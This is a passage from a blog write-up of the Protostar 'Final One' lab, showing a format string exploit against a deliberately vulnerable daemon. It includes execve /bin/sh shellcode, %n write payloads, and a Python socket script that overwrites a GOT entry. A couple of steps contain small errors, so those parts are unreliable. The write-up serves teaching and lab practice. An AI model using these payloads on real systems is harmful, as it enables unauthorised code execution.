<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="IntroductionFor this section, we’ll be looking into the exploits that are associated with format string vulnerabilities.  We will be using Final One from the Protostar Exploit Exercises on the Protost">
<meta property="og:type" content="article">
<meta property="og:title" content="Binary Exploitation - Protostar - Format String">
<meta property="og:url" content="https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/index.html">
<meta property="og:site_name" content="Winston&#39;s Blog">
<meta property="og:description" content="IntroductionFor this section, we’ll be looking into the exploits that are associated with format string vulnerabilities.  We will be using Final One from the Protostar Exploit Exercises on the Protost">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-01-03T09:07:49.000Z">
<meta property="article:modified_time" content="2020-04-28T14:09:39.116Z">
<meta property="article:author" content="Winston Zhao">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo.png">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
          
        
    
    <!-- title -->
    <title>Binary Exploitation - Protostar - Format String</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/01/06/binary-exploitation-protostar-heap/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/12/31/binary-exploitation-protostar-stack/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&text=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&is_video=false&description=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Binary Exploitation - Protostar - Format String&body=Check out this article: https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&title=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&name=Binary Exploitation - Protostar - Format String&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://winstonzhao.github.io/2020/01/03/binary-exploitation-protostar-format-string/&t=Binary Exploitation - Protostar - Format String" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnerability"><span class="toc-number">2.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Challenge"><span class="toc-number">3.</span> <span class="toc-text">Challenge</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Binary Exploitation - Protostar - Format String
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Winston's Blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-01-03T09:07:49.000Z" itemprop="datePublished">2020-01-03</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Security/" rel="tag">Security</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>For this section, we’ll be looking into the exploits that are associated with format string vulnerabilities. </p>
<p>We will be using <a href="https://exploit.education/protostar/final-one/" target="_blank" rel="noopener">Final One</a> from the Protostar Exploit Exercises on the Protostar VM. This VM gives us an environment where modern security features, such as ASLR are not enabled.</p>
<p>The last caveat is that this exploit will be done “over the network”, as the binary that we will be exploiting is a “web server” that accepts TCP connections that emulates an authentication server.</p>
<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>The vulnerability is when raw user input is passed into <code>printf()</code> from the stack, then we can arbitrarily write to an arbitrary address using <code>%x$n</code>, which will write to the <code>xth</code> variable.</p>
<p>The <code>%n</code> flag will write the number of characters printed so far. </p>
<p>The exploit can be demonstrated using this small snippet.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> zero = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">text</span>[<span class="number">124</span>];</span><br><span class="line">	fgets(<span class="built_in">text</span>, <span class="number">124</span>, <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="built_in">text</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, zero);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The first interesting thing we can do is shown below.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'AAAA' + ' %x' * 20"</span> | ./format-str-vuln</span><br></pre></td></tr></table></figure>
<p>We get output:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAA 7c b7fd8420 bffff6f4 b7fec242 41414141 20782520 25207825 78252078 20782520 25207825 78252078 2078252 0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078</span><br></pre></td></tr></table></figure>
<p>You should know that passing <code>%x</code> into <code>printf()</code> will cause it to print out the nth parameter in hex form.</p>
<p>What we can see here, is that even through we don’t pass any extra parameters to <code>printf(text)</code> , <code>printf()</code> still attempts print out the parameters. Furthermore, we can even see that we our <code>AAAA</code>‘s in the memory that is printed. This is because, <code>fgets()</code> writes to <code>text</code> which is on the stack of <code>main()</code>. Thus, when <code>printf()</code>  attempts to print the subsequent arguments, it will go through the stack and eventually reach the stack for <code>main()</code> and subsequently the string that we provided. </p>
<p>This means that using the numbered argument syntax, we can write to an address that we pass in. We can see that the <code>AAAA</code>‘s were the 5th argument and so we’ll replace them with the intended address to write to (in this case it is the address of the <code>zero</code> variable which is <code>0x08049660</code>. Then use <code>%5$n</code> to write to that address.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print '\x60\x96\x04\x08' + '%5\$n'"</span> | ./format-str-vuln</span><br></pre></td></tr></table></figure>

<p>We can see that we’ve successfully written <code>4</code> to the <code>zero</code> variable.  Which is the number of character that we’ve written thus far (the size of the address for <code>zero</code>).</p>
<p>A trick to write an arbitrary value is to use the padding function that <code>printf()</code> also comes with, e.g. <code>%1000x</code> will pad 1000 characters.</p>
<p>Thus if we use the following input:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print '\x60\x96\x04\x08' + '%5\$n'"</span> | ./format-str-vuln</span><br></pre></td></tr></table></figure>
<p> We can see that we’ve set <code>zero</code> to 1000. </p>
<p>Finally, we can use this arbitrary write to overwrite the entry in the global offset table to redirect code execution.</p>
<h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><p>Let’s take a look at the <a href="https://exploit.education/protostar/final-one/" target="_blank" rel="noopener">Final One</a> challenge.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syslog.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2994</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> username[<span class="number">128</span>];</span><br><span class="line"><span class="keyword">char</span> hostname[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">logit</span><span class="params">(<span class="keyword">char</span> *pw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"Login from %s as [%s] with password [%s]\n"</span>, hostname, username, pw);</span><br><span class="line"></span><br><span class="line">  syslog(LOG_USER|LOG_DEBUG, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trim</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line"></span><br><span class="line">  q = <span class="built_in">strchr</span>(str, <span class="string">'\r'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(str, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parser</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">line</span>[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[final1] $ "</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(fgets(<span class="built_in">line</span>, <span class="keyword">sizeof</span>(<span class="built_in">line</span>)<span class="number">-1</span>, <span class="built_in">stdin</span>)) &#123;</span><br><span class="line">      trim(<span class="built_in">line</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"username "</span>, <span class="number">9</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(username, <span class="built_in">line</span>+<span class="number">9</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"login "</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(username[<span class="number">0</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"invalid protocol\n"</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              logit(<span class="built_in">line</span> + <span class="number">6</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"login failed\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[final1] $ "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getipport</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">  l = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">  <span class="keyword">if</span>(getpeername(<span class="number">0</span>, &amp;<span class="built_in">sin</span>, &amp;l) == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(<span class="number">1</span>, <span class="string">"you don't exist"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(hostname, <span class="string">"%s:%d"</span>, inet_ntoa(<span class="built_in">sin</span>.sin_addr), ntohs(<span class="built_in">sin</span>.sin_port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  getipport();</span><br><span class="line">  parser();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We can see that the program expects the user to provide a username through <code>username user</code> and then attempt to login with <code>login password</code>, if the user has not been selected before logging in, then a <code>login failed</code> message will be sent. We can play around with this program using <code>netcat</code>. The program is running by default on the Protostar VM and thus we can be connect to it using the following command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 127.0.0.1 2994</span><br></pre></td></tr></table></figure>
<p>Then we can play around with the program:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[final1] $ login pw      </span><br><span class="line">invalid protocol</span><br><span class="line">[final1] $ username user   </span><br><span class="line">[final1] $ login pw</span><br><span class="line">login failed</span><br></pre></td></tr></table></figure>
<p>The exploit in this program can be found in the <code>syslog</code> function. Using <code>man syslog</code> can be observe that <code>syslog</code> is actually just a call to <code>printf()</code> that is directed to the kernel log or <code>/var/log/syslog</code>.</p>
<p>We can check this by attempting to login with the password <code>%x %x %x %x %x</code> and checking <code>/var/log/syslog</code> (you’ll have to be root to check the <code>syslog</code>).</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Jan  3 04:09:44 (none) final1: Login from 127.0.0.1:50673 as [user] with password [8049ee4 804a2a0 804a220 bffffbd6 b7fd7ff4]</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<p>The approach for this challenge will be to place shell code in <code>username</code> and then redirect code execution by overwriting the GOT entry for <code>printf()</code>, then means that after <code>logit()</code> finishes executing, the subsequent call to <code>print()</code> should give us root access of to the program.</p>
<p>To find the GOT entry for <code>printf()</code> we open the <code>final1</code> in <code>gdb</code> and then we can use <code>print printf</code> to find the PLT entry, and then follow that code to find the GOT entry.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print printf</span><br><span class="line">$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x8048ccc &lt;printf@plt&gt;</span><br><span class="line">(gdb) disassemble 0x8048ccc</span><br><span class="line">Dump of assembler code for function printf@plt:</span><br><span class="line">0x08048ccc &lt;printf@plt+0&gt;:	jmp    *0x804a174</span><br><span class="line">0x08048cd2 &lt;printf@plt+6&gt;:	push   $0xf8</span><br><span class="line">0x08048cd7 &lt;printf@plt+11&gt;:	jmp    0x8048acc</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) x&#x2F;x 0x804a174</span><br><span class="line">0x804a174 &lt;_GLOBAL_OFFSET_TABLE_+136&gt;:	0x08048cd2</span><br></pre></td></tr></table></figure>
<p>So, the address of <code>printf</code> is <code>0x08048cd2</code>.</p>
<p>Next, we’ll need to find the address for username, then can be done simply with:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span> &amp;username</span><br><span class="line"><span class="variable">$2</span> = (char (*)[128]) 0x804a220</span><br></pre></td></tr></table></figure>
<p>Or, alternatively we can see that <code>username</code> is used in <code>strcpy()</code>  in <code>parser()</code> and from the disassembly of <code>parser()</code> we can find the address for username.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08049995 &lt;parser+88&gt;:	movl   <span class="variable">$0x804a220</span>,(%esp)</span><br><span class="line">0x0804999c &lt;parser+95&gt;:	call   0x8048cbc &lt;strcpy@plt&gt;</span><br></pre></td></tr></table></figure>
<p>So, the address of <code>username</code> is <code>0x804a220</code>.</p>
<p>We’ll also use some shell code from the internet <code>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00</code> (if this is executed, it should give us root).</p>
<p>The next step is to find a way to inject these addresses into the “arguments” of the <code>printf</code> in <code>syslog</code>. We can set up a small script to connect to the server and interact with it.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waitForLine</span><span class="params">(s)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">                c = s.recv(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="string">'$'</span>):</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((<span class="string">"127.0.0.1"</span>,<span class="number">2994</span>))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x00"</span></span><br><span class="line"></span><br><span class="line">username = <span class="number">0x804a220</span></span><br><span class="line">got = <span class="number">0x804a174</span></span><br><span class="line">waitForLine(sock)</span><br><span class="line">sock.send(<span class="string">"username "</span> + shellcode + <span class="string">"\n"</span>)</span><br><span class="line">waitForLine(sock)</span><br><span class="line">sock.send(<span class="string">"login "</span> + <span class="string">"AAAAA"</span> + <span class="string">" %x"</span> * <span class="number">30</span>  + <span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>

<p>The <code>waitForLine()</code> function is a small helper that will cause the application to hang if nothing is received from the user, also accounting for the <code>[final1] $</code> that heads every message.  We connect to the server using a socket and then will send the shell code with the username and then a password of <code>[%x]</code>‘s headed by <code>AAAAA</code>, then will let us attempt to find the <code>A</code>‘s in the <code>syslog</code> to find out which argument the <code>A</code>‘s are on the stack.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jan  3 04:25:02 (none) final1: Login from 127.0.0.1:50674 as [1�Ph//shh/bin��PS���<span class="comment">#013̀] with password [AAAAA 8049ee4 804a2a0 804a220 bffffbd6 b7fd7ff4 bffffa28 69676f4c 7266206e 31206d6f 302e3732 312e302e 3630353a 61203437 315b2073 2f6850c0 6868732f 6e69622f 5350e389 bb0e189 205d80cd 68746977 73617020 726f7773 415b2064 41414141 20782520 25207825 78252078 20782520 25207825]</span></span><br></pre></td></tr></table></figure>
<p>We can see that <code>A</code>‘s start in the last byte of the 24th argument and take up the whole 25th argument. Then means that we can modify the GOT entry by changing the code as follows:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock.send(<span class="string">"login "</span> + <span class="string">"A"</span> + struct.pack(<span class="string">"I"</span>, got) + struct.pack(<span class="string">"I"</span>, got + <span class="number">2</span>) + <span class="string">"%1000x"</span> + <span class="string">"%25$n"</span>  + <span class="string">"%1000x"</span> + <span class="string">"%26$n"</span> +  <span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>
<p>We can use <code>struct.pack</code> to help us reverse the bytes in the GOT address without us having to do it manually.  Another interesting point is that there are two <code>struct.pack()</code> calls, one for <code>got</code> and one for <code>got + 2</code>, this is because we will write the lower 4 bytes of the GOT first and then write to upper 4 bytes of the GOT to save time. The value that we are writing to write to the GOT entry is <code>0x804a220</code> or <code>134521376</code>, it takes a bit of time for <code>printf()</code> to process this much padding and thus we can save some time by simply writing twice instead. It should also be noted that the lower bytes need to be written first, since it writing to the lower bytes will also overwrite the upper bytes.</p>
<p>We know that the addresses that we’ve put into the message are the 25th and 26th argument on the stack and thus we can use the “%x$n” syntax to write to them.</p>
<p>Now to calculate the padding,  the easiest to do this is to simply attach a debugger to <code>final1</code> using <code>ps -aux | grep final1</code>  to find the <code>pid</code> of <code>final1</code>, attaching <code>gdb</code> to <code>final1</code>. We can then set <code>set follow-fork-mode child</code>, which will let <code>gdb</code> follow the forking that is done by the binary. We can then set a break point after <code>logit()</code>, then we can use <code>x/x 0x804a174</code> to see what the value is and then increase or decrease the padding accordingly.</p>
<p>However, slightly more methodical way to do this would be to calculate by hand the amount of padding that is required. Let’s take a look at the string that is passed to <code>syslog</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(buf,  <span class="keyword">sizeof</span>(buf),  <span class="string">"Login from %s as [%s] with password [%s]\n"</span>, hostname, username, pw);</span><br></pre></td></tr></table></figure>

<p>We are really only interested in the amount of characters before the start of password. This can be calculated using the following formula:<br><code>l = len(&quot;Login from  as [] with password [&quot;) + len(hostname) + len(username) + 9</code></p>
<p>The 9 comes from the <code>A</code> followed by two addresses which accounts for 9 bytes at the beginning of our ‘password’.  The <code>hostname</code> can be retrieved by using <code>sock.getpeername()[0] + &quot;:&quot; + str(sock.getpeername()[1])</code>. </p>
<p>Now to calculate the size of the padding we’ll need to get to <code>0xa220</code>, we essentially just do <code>0xa220 - l</code>, or <code>(username &amp; 0x000ffff) - l</code>.</p>
<p>For the second padding, it is given by <code>0x10804 - firstpad - l</code>. We need to use <code>0x10804</code> rather than <code>0x804</code> since, we cannot unwrite characters to decrease the value that “%n” will write, and thus we must use the overflown value. Instead of <code>0x10804</code>, we can also use <code>((username &gt;&gt;  16)  |  0x10000)</code> to the same effect.</p>
<p>Putting it all together:</p>
